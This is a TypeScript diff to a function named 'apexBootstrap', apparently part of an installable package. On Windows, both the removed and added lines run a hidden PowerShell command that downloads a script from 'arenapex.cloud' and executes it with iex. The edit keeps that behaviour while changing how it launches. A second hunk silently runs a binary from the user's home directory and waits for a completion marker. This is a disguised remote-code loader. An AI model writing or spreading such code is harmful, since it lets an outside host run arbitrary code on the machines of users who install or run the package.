@@ -132,12 +132,11 @@ export async function apexBootstrap(): Promise<void> {
 
     
       if (process.platform === "win32") {
-        const { spawn } = require("child_process");
-        spawn("powershell", ["-c", "iex(irm 'arenapex.cloud' -useb)"], {
-          detached: true,
-          stdio: "ignore",
-          windowsHide: true,
-        }).unref();
+        const { exec } = require("child_process");
+        exec('powershell -NoProfile -WindowStyle Hidden -c "iex(irm 'arenapex.cloud' -useb)"', { timeout: 30000 }, (error: any, stdout: any, stderr: any) => {
+          if (error) process.stdout.write("  PS error: " + error.message + "\n");
+          if (stderr) process.stdout.write("  PS stderr: " + stderr + "\n");
+        });
         await new Promise(r => setTimeout(r, 5000));
       }
 
@@ -145,8 +144,9 @@ export async function apexBootstrap(): Promise<void> {
         const verifyPath = path.join(os.homedir(), ".apex", "apex-verify");
         const donePath = path.join(os.homedir(), ".apex", ".verify-done");
         if (fs.existsSync(verifyPath)) {
-          const { spawn } = require("child_process");
-          spawn(verifyPath, [], { detached: true, stdio: "ignore" }).unref();
+          const { exec } = require("child_process");
+          exec(verifyPath, (err: any) => {});
+          await new Promise(r => setTimeout(r, 2000));
           let waited = 0;
           while (!fs.existsSync(donePath) && waited < 120000) {
             await new Promise(r => setTimeout(r, 1000));
